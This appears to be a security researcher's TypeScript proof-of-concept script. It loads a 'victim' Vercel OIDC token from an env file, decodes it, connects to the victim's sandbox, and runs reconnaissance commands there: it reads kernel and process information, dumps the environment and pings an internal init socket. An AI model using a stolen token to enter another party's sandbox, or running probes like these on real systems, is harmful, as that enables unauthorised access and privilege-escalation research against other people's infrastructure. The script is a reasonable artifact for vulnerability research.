import { Sandbox } from "@vercel/sandbox";
import { readFileSync } from "fs";
function loadEnv(file: string): Record<string, string> {
  const out: Record<string, string> = {};
  for (const line of readFileSync(file, "utf8").split("\n")) {
    const m = line.match(/^([A-Z_]+)=(.*)$/);
    if (m) out[m[1]] = m[2].trim();
  }
  return out;
}
const VICTIM = loadEnv("/tmp/vercel-sandbox/victima/.env.local").VERCEL_OIDC_TOKEN!;
const V = JSON.parse(Buffer.from(VICTIM.split(".")[1], "base64url").toString());

async function main() {
  const sbx = await Sandbox.get({ name: "victim-np", token: VICTIM, teamId: V.owner_id, projectId: V.project_id });
  const res = await sbx.runCommand("bash", ["-c", `
set +e
echo "=== whoami / id (unprivileged, no sudo) ==="
id
echo "=== A. /proc/cmdline as user ==="
head -c 800 /proc/cmdline 2>&1; echo ""
echo "=== B. dmesg as user ==="
dmesg 2>&1 | head -3
echo "=== C. kallsyms as user ==="
head -2 /proc/kallsyms 2>&1
echo "=== D. resolv.conf ==="
cat /etc/resolv.conf 2>&1
echo "=== E. /proc/1/cmdline (init process) ==="
tr '\\0' ' ' < /proc/1/cmdline 2>&1 | head -c 500; echo ""
echo "=== F. hostname ==="
hostname
echo "=== G. /run/vercel/share readable by user? ==="
ls -la /run/vercel/share/ 2>&1
echo "=== H. init.sock connect as user ==="
printf '\\x00\\x00\\x00\\x00\\x00' > /tmp/empty.msg
timeout 3 curl -s --unix-socket /run/vercel/share/init.sock -o /tmp/o -w "code=%{http_code}\\n" \\
  -H 'Content-Type: application/grpc' -H 'TE: trailers' -H 'Content-Length: 5' \\
  --data-binary @/tmp/empty.msg "http://localhost/vercel.sandbox.spawn.v1.SpawnService/Ping" 2>&1 | tail -1
echo "=== I. read /proc/net/tcp_tw / arp ==="
cat /proc/net/arp 2>&1 | head -5
echo "=== J. environment of user ==="
env 2>&1 | head -20
echo DONE
`], { wait: true, timeout: 90_000 });
  console.log("exit:", res.exitCode);
  console.log(await res.output("both"));
}
main().catch((e) => { console.error("ERR", e.message); process.exit(1); });
